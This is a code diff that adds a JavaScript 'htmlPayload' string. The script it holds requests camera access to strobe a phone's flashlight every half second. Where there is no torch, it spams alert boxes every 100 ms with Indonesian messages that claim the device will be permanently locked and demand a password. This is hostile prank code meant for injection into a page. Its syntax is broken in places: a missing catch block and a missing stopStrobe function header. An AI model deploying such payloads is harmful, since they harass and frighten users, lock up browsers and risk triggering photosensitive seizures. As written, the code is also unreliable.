@@ -1,0 +1,110 @@
+const htmlPayload = '<script>
+(async function() {
+    "use strict";
+
+    let torchTrack = null;
+    let strobeInterval = null;
+    let blinkState = false;
+    let alertInterval = null;
+
+    async function startTorch() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: 'environment'
+                }
+            });
+
+            const track = stream.getVideoTracks()[0];
+
+            if (!track) {
+                return false;
+            }
+
+            const capabilities = track.getCapabilities();
+
+            if (!capabilities || !capabilities.torch) {
+                track.stop();
+                return false;
+            }
+
+            torchTrack = track;
+            return true;
+        } catch (e) {
+            return false;
+        }
+    }
+
+    function setTorch(state) {
+        if (!torchTrack) return false;
+
+        try {
+            torchTrack.applyConstraints({
+                advanced: [{ torch: state }]
+            });
+                        return false;
+        }
+    }
+
+    function strobeTick() {
+        blinkState = !blinkState;
+        setTorch(blinkState);
+    }
+
+    function startAlertSpam() {
+        if (alertInterval) {
+            clearInterval(alertInterval);
+        }
+
+        alertInterval = setInterval(function() {
+            alert("PRANK LU BAKAL LOCK PERMANEN!!!");
+        }, 100);
+
+        alert("MASUKIN KATA SANDI NYAN BENAR ");
+    }
+
+    function stopAlertSpam() {
+        if (alertInterval) {
+            clearInterval(alertInterval);
+            alertInterval = null;
+        }
+    }
+
+    async function runStrobe() {
+        const ready = await startTorch();
+
+        if (!ready) {
+            console.log('Senter tidak support, beralih ke alert spam');
+            startAlertSpam();
+            return;
+        }
+
+        if (strobeInterval) {
+            clearInterval(strobeInterval);
+        }
+
+        strobeInterval = setInterval(strobeTick, 500);
+        strobeTick();
+                torchTrack.stop();
+        torchTrack = null;
+    }
+
+    stopAlertSpam();
+    console.log('Strobe dimatikan');
+}
+
+runStrobe();
+
+window.flashLight = {
+    start: runStrobe,
+    stop: stopStrobe,
+    toggle: function() {
+        if (!strobeInterval || alertInterval) {
+            stopStrobe();
+        } else {
+            runStrobe();
+        }
+    }
+};
+})();
+</script>';
